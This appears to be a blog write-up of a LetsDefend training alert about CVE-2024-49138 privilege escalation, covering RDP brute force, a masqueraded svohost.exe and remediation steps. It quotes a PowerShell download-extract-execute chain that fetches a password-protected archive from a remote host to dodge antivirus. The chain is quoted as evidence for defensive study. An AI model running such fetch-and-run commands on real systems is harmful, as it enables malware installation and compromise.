<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="Alert Name: SOC335 – CVE-2024-49138 Exploitation Detected
Severity: High
Event ID: 313
Event Time: Jan 22, 2025, 02:37 AM
Category: Privilege Escalation
Base Information Field Value Event ID 313 Event Time Jan 22, 2025, 02:37 AM Rule SOC335 – CVE-2024-49138 Exploitation Detected Analyst Level Security Analyst Hostname Victor IP Address 172.16.17.207 Process Name svohost.exe Process Path C:\temp\service_installer\svohost.exe Process ID 7640 Parent Process C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Command Line ??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1 File Hash (SHA-256) b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9 Process User EC2AMAZ-ILGVOIN\LetsDefend Trigger Reason Suspicious behavior patterns linked to CVE-2024-49138 Device Action Allowed Incident Details Field Value Incident Name EventID 313 – SOC335 CVE-2024-49138 Exploitation Incident Type Privilege Escalation Created Date Jan 08, 2026, 09:12 AM Pre-Investigation Notes Date: Jan 22, 2025, 02:37 AM Hostname: Victor IP Address: 172." />
<meta name="keywords" content=", letsdefend, soc, privilege-escalation, exploitation, windows, blue" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/letsdefend/alerts/-soc335--cve-2024-49138-privilege-escalation-exploitation-analysis/" />


    <title>
        
            LetsDefend SOC335 – CVE-2024-49138 Privilege Escalation Exploitation Analysis :: Hello w3nch 
        
    </title>





  <link rel="stylesheet" href="/main.min.ebe3824dfa5345ef854f8b255c278f701966e9be3892354b588fb1650ecd358e.css" integrity="sha256-6&#43;OCTfpTRe&#43;FT4slXCePcBlm6b44kjVLWI&#43;xZQ7NNY4=" crossorigin="anonymous">




    
        <link rel="stylesheet" type="text/css" href="css/code.css">
    

    
        <link rel="stylesheet" type="text/css" href="css/writeups.css">
    


    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="LetsDefend SOC335 – CVE-2024-49138 Privilege Escalation Exploitation Analysis">
<meta itemprop="description" content="Alert Name: SOC335 – CVE-2024-49138 Exploitation Detected
Severity: High
Event ID: 313
Event Time: Jan 22, 2025, 02:37 AM
Category: Privilege Escalation
Base Information Field Value Event ID 313 Event Time Jan 22, 2025, 02:37 AM Rule SOC335 – CVE-2024-49138 Exploitation Detected Analyst Level Security Analyst Hostname Victor IP Address 172.16.17.207 Process Name svohost.exe Process Path C:\temp\service_installer\svohost.exe Process ID 7640 Parent Process C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Command Line ??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1 File Hash (SHA-256) b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9 Process User EC2AMAZ-ILGVOIN\LetsDefend Trigger Reason Suspicious behavior patterns linked to CVE-2024-49138 Device Action Allowed Incident Details Field Value Incident Name EventID 313 – SOC335 CVE-2024-49138 Exploitation Incident Type Privilege Escalation Created Date Jan 08, 2026, 09:12 AM Pre-Investigation Notes Date: Jan 22, 2025, 02:37 AM Hostname: Victor IP Address: 172."><meta itemprop="datePublished" content="2026-01-11T00:00:00+00:00" />
<meta itemprop="dateModified" content="2026-01-11T00:00:00+00:00" />
<meta itemprop="wordCount" content="720">
<meta itemprop="keywords" content="letsdefend,soc,privilege-escalation,exploitation,windows,blue," />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="LetsDefend SOC335 – CVE-2024-49138 Privilege Escalation Exploitation Analysis"/>
<meta name="twitter:description" content="Alert Name: SOC335 – CVE-2024-49138 Exploitation Detected
Severity: High
Event ID: 313
Event Time: Jan 22, 2025, 02:37 AM
Category: Privilege Escalation
Base Information Field Value Event ID 313 Event Time Jan 22, 2025, 02:37 AM Rule SOC335 – CVE-2024-49138 Exploitation Detected Analyst Level Security Analyst Hostname Victor IP Address 172.16.17.207 Process Name svohost.exe Process Path C:\temp\service_installer\svohost.exe Process ID 7640 Parent Process C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Command Line ??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1 File Hash (SHA-256) b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9 Process User EC2AMAZ-ILGVOIN\LetsDefend Trigger Reason Suspicious behavior patterns linked to CVE-2024-49138 Device Action Allowed Incident Details Field Value Incident Name EventID 313 – SOC335 CVE-2024-49138 Exploitation Incident Type Privilege Escalation Created Date Jan 08, 2026, 09:12 AM Pre-Investigation Notes Date: Jan 22, 2025, 02:37 AM Hostname: Victor IP Address: 172."/>





    <meta property="article:section" content="SOC Writeups" />

    <meta property="article:section" content="Endpoint Security" />



    <meta property="article:published_time" content="2026-01-11 00:00:00 &#43;0000 UTC" />












    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                hello ;)</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
                <nav class="menu">
    <ul class="menu__inner">
                <li><a href="/about/">About</a></li>
            
                <li><a href="/posts/">Blog</a></li>
            
                <li><a href="/contact/">Contact</a></li>
            
                <li><a href="/resume.pdf">Resume</a></li>
            
                <li><a href="/writeups/">Writeups</a></li>
            
    </ul>
</nav>


                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            
    <div class="content">
        <main class="post">

            <div class="post-info">
                
                </p>
            </div>

            <article>
                <h2 class="post-title"><a href="http://localhost:1313/writeups/letsdefend/alerts/-soc335--cve-2024-49138-privilege-escalation-exploitation-analysis/">LetsDefend SOC335 – CVE-2024-49138 Privilege Escalation Exploitation Analysis</a></h2>

                
                
                

                <div class="post-content">
                    <p>Alert Name: SOC335 – CVE-2024-49138 Exploitation Detected<br>
Severity: High<br>
Event ID: 313<br>
Event Time: Jan 22, 2025, 02:37 AM<br>
Category: Privilege Escalation</p>
<h3 id="base-information">Base Information</h3>
<table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Event ID</td>
<td>313</td>
</tr>
<tr>
<td>Event Time</td>
<td>Jan 22, 2025, 02:37 AM</td>
</tr>
<tr>
<td>Rule</td>
<td>SOC335 – CVE-2024-49138 Exploitation Detected</td>
</tr>
<tr>
<td>Analyst Level</td>
<td>Security Analyst</td>
</tr>
<tr>
<td>Hostname</td>
<td>Victor</td>
</tr>
<tr>
<td>IP Address</td>
<td>172.16.17.207</td>
</tr>
<tr>
<td>Process Name</td>
<td>svohost.exe</td>
</tr>
<tr>
<td>Process Path</td>
<td>C:\temp\service_installer\svohost.exe</td>
</tr>
<tr>
<td>Process ID</td>
<td>7640</td>
</tr>
<tr>
<td>Parent Process</td>
<td>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</td>
</tr>
<tr>
<td>Command Line</td>
<td>??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</td>
</tr>
<tr>
<td>File Hash (SHA-256)</td>
<td>b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9</td>
</tr>
<tr>
<td>Process User</td>
<td>EC2AMAZ-ILGVOIN\LetsDefend</td>
</tr>
<tr>
<td>Trigger Reason</td>
<td>Suspicious behavior patterns linked to CVE-2024-49138</td>
</tr>
<tr>
<td>Device Action</td>
<td>Allowed</td>
</tr>
</tbody>
</table>
<h3 id="incident-details">Incident Details</h3>
<table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Incident Name</td>
<td>EventID 313 – SOC335 CVE-2024-49138 Exploitation</td>
</tr>
<tr>
<td>Incident Type</td>
<td>Privilege Escalation</td>
</tr>
<tr>
<td>Created Date</td>
<td>Jan 08, 2026, 09:12 AM</td>
</tr>
</tbody>
</table>
<h3 id="pre-investigation-notes">Pre-Investigation Notes</h3>
<ul>
<li>Date: Jan 22, 2025, 02:37 AM</li>
<li>Hostname: Victor</li>
<li>IP Address: 172.16.17.207</li>
<li>Process Name: svohost.exe</li>
<li>Process ID: 7640</li>
<li>File Hash: b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9</li>
<li>User: EC2AMAZ-ILGVOIN\LetsDefend</li>
</ul>
<h2 id="play-book">Play Book</h2>
<p>The process name is suspicious because it closely mimics svchost.exe by replacing one character, a common masquerading technique used by malware to blend in with legitimate Windows processes.</p>
<p>Check if the malware is quarantined or cleaned</p>
<table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Type</td>
<td>OS</td>
</tr>
<tr>
<td>Source Address</td>
<td>185.107.56.141</td>
</tr>
<tr>
<td>Source Port</td>
<td>0</td>
</tr>
<tr>
<td>Destination Address</td>
<td>172.16.17.207</td>
</tr>
<tr>
<td>Destination Port</td>
<td>0</td>
</tr>
<tr>
<td>Time</td>
<td>Jan 22, 2025, 02:35 PM</td>
</tr>
<tr>
<td>Username</td>
<td>Victor</td>
</tr>
<tr>
<td>Event ID</td>
<td>4624</td>
</tr>
<tr>
<td>Logon Type</td>
<td>10 (RemoteInteractive)</td>
</tr>
<tr>
<td>Source IP</td>
<td>185.107.56.141</td>
</tr>
</tbody>
</table>
<h3 id="malware-analysis">Malware Analysis</h3>
<p><a href="https://www.virustotal.com/gui/file/b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9">VirusTotal</a> analysis confirms the file is highly suspicious based on community detections and behavioral indicators.</p>
<p>YARA Signature Match – THOR APT Scanner<br>
Rule: SUSP_HKTL_Gen_Pattern_Feb25_2<br>
Rule Set: Livehunt – Hacktools Indicators<br>
Description: Generic hacktool behavior pattern<br>
Detection Ratio: 51 / 74 engines</p>
<p>Hybrid Analysis reports indicate the executable behaves like a service installer abuse tool commonly used during privilege escalation attacks.</p>
<ul>
<li><a href="https://hybrid-analysis.com/sample/b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9/679be384e3acdb15620a2e56">Service-installer.zip</a></li>
<li><a href="https://hybrid-analysis.com/sample/b432dcf4a0f0b601b1d79848467137a5e25cab5a0b7b1224be9d3b6540122db9/67a9a943fde038c1d202bd27">Svohost.exe</a>
<img src="https://i.ibb.co/yFKNcq8q/Pasted-image-20260108115439.png" alt=""></li>
</ul>
<h3 id="command-and-control-activity-review">Command and Control Activity Review</h3>
<p>Multiple authentication attempts were observed from the same external IP address prior to successful access.</p>
<p>Failed Login Attempts (Event ID 4625)</p>
<table>
<thead>
<tr>
<th>Time</th>
<th>Username</th>
<th>Source IP</th>
<th>Destination IP</th>
<th>Error Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Jan 22, 2025, 02:35 PM</td>
<td>admin</td>
<td>185.107.56.141</td>
<td>172.16.17.207</td>
<td>0xC000006D</td>
<td>Invalid credentials</td>
</tr>
<tr>
<td>Jan 22, 2025, 02:35 PM</td>
<td>admin</td>
<td>185.107.56.141</td>
<td>172.16.17.207</td>
<td>0xC000006D</td>
<td>Invalid credentials</td>
</tr>
<tr>
<td>Jan 22, 2025, 02:35 PM</td>
<td>guest</td>
<td>185.107.56.141</td>
<td>172.16.17.207</td>
<td>0xC000006D</td>
<td>Invalid credentials</td>
</tr>
<tr>
<td>Jan 22, 2025, 02:35 PM</td>
<td>guest</td>
<td>185.107.56.141</td>
<td>172.16.17.207</td>
<td>0xC000006D</td>
<td>Invalid credentials</td>
</tr>
</tbody>
</table>
<p>Successful Login (Event ID 4624)</p>
<table>
<thead>
<tr>
<th>Time</th>
<th>Username</th>
<th>Source IP</th>
<th>Destination IP</th>
<th>Logon Type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Jan 22, 2025, 02:35 PM</td>
<td>Victor</td>
<td>185.107.56.141</td>
<td>172.16.17.207</td>
<td>10</td>
<td>Successful RDP login</td>
</tr>
</tbody>
</table>
<p><img src="https://i.ibb.co/ZzGFMGPJ/Pasted-image-20260108120538.png" alt=""></p>
<h3 id="containment-actions">Containment Actions</h3>
<ul>
<li>User account was contained for further investigation</li>
<li>Host activity monitoring was enabled</li>
<li>Malicious process execution was blocked</li>
</ul>
<p>Observed Execution Chain</p>
<p>powershell.exe downloaded and extracted a password-protected archive and executed the masqueraded binary from a temporary directory.
<img src="https://i.ibb.co/kV4y3WzK/Pasted-image-20260108115110.png" alt="">
PowerShell command used:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$url = <span style="color:#e6db74">&#39;https://files-ld.s3.us-east-2.amazonaws.com/service-installer.zip&#39;</span>
</span></span><span style="display:flex;"><span>$dest = <span style="color:#e6db74">&#39;C:\temp\service-installer.zip&#39;</span>
</span></span><span style="display:flex;"><span>$extractPath = <span style="color:#e6db74">&#39;C:\temp&#39;</span>
</span></span><span style="display:flex;"><span>$password = <span style="color:#e6db74">&#39;infected&#39;</span>
</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri $url -OutFile $dest
</span></span><span style="display:flex;"><span>7z.exe x -pinfected -oC:\temp service-installer.zip
</span></span><span style="display:flex;"><span>C:\temp\service_installer\svohost.exe
</span></span></code></pre></div><ol>
<li>
<p><strong>Defines a download URL</strong>
<code>$url</code> points to a ZIP file hosted online (<code>service-installer.zip</code>).</p>
</li>
<li>
<p><strong>Sets where the file will be saved</strong>
$dest is the local path where the ZIP file will be downloaded:
C:\temp\service-installer.zip</p>
</li>
<li>
<p><strong>Defines the extraction directory</strong>
$extractPath is set to C:\temp, where the contents of the ZIP will be unpacked.</p>
</li>
<li>
<p><strong>Defines the ZIP password</strong>
$password = &lsquo;infected&rsquo;
Password-protected ZIP files are commonly used to evade antivirus scanning during download.</p>
</li>
<li>
<p><strong>Downloads the ZIP file</strong>
Invoke-WebRequest -Uri $url -OutFile $dest
This pulls the ZIP archive from the remote server and saves it locally.</p>
</li>
<li>
<p><strong>Extracts the ZIP using 7-Zip</strong></p>
</li>
</ol>
<p>7z.exe x -pinfected -oC:\temp service-installer.zip
x → extract files
-p infected → use the password
-oC:\temp → output directory This unpacks the archive into C:\temp.</p>
<ol start="7">
<li><strong>Executes the extracted binary</strong>
C:\temp\service_installer\svohost.exe
This directly runs the executable after extraction.</li>
</ol>
<h3 id="impact-assessment">Impact Assessment</h3>
<ul>
<li>Privilege escalation: Confirmed</li>
<li>Host compromise: Partial</li>
<li>Persistence risk: High</li>
<li>Lateral movement: Not observed</li>
<li>Data exposure: Unknown</li>
</ul>
<h3 id="recommended-actions">Recommended Actions</h3>
<ol>
<li>Immediately isolate the affected endpoint</li>
<li>Reset credentials associated with the compromised user</li>
<li>Remove all artifacts related to the malicious installer</li>
<li>Patch systems vulnerable to CVE-2024-49138</li>
<li>Enable enhanced logging and EDR protections</li>
<li>Monitor for similar masquerading techniques across the environment</li>
</ol>
<h3 id="final-verdict">Final Verdict</h3>
<p>True Positive – Confirmed Privilege Escalation Exploitation</p>
<p>The alert represents a successful exploitation attempt leveraging a disguised service binary associated with CVE-2024-49138. Immediate remediation and system hardening are required.</p>
<h4 id="analyst-note">Analyst Note</h4>
<p>The investigation confirmed the execution of a malicious binary impersonating a legitimate Windows service process. The activity originated from an external IP address, involved multiple failed authentication attempts, and resulted in a successful RDP login followed by malicious process execution. Evidence supports a confirmed privilege escalation scenario with a high risk of persistence if not remediated.</p>

                </div>
            </article>

            <hr />

            <div class="post-info">
                
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="http://localhost:1313/tags/letsdefend/">letsdefend</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/soc/">soc</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/privilege-escalation/">privilege-escalation</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/exploitation/">exploitation</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/windows/">windows</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/blue/">blue</a></span>
        
    </p>

                
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/soc-writeups/">SOC Writeups</a></span>
        <span class="tag"><a href="http://localhost:1313/categories/endpoint-security/">Endpoint Security</a></span>
        
    </p>

            </div>
        </main>
    </div>


            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            
            <span><a href="http://localhost:1313/"></a></span>
            <span></span>
            
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by Hugo</span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.19d7885e5a4b0e5e2cd7238fc80b8b19888099cb78c032aedeb0b3b0010b8bb3dfb34849cf40a9e83f55f266aa32354528c10a24f2a42e6e8e21e813a26d9647.js" integrity="sha512-GdeIXlpLDl4s1yOPyAuLGYiAmct4wDKu3rCzsAELi7Pfs0hJz0Cp6D9V8maqMjVFKMEKJPKkLm6OIegTom2WRw=="></script>




    </body>
</html>
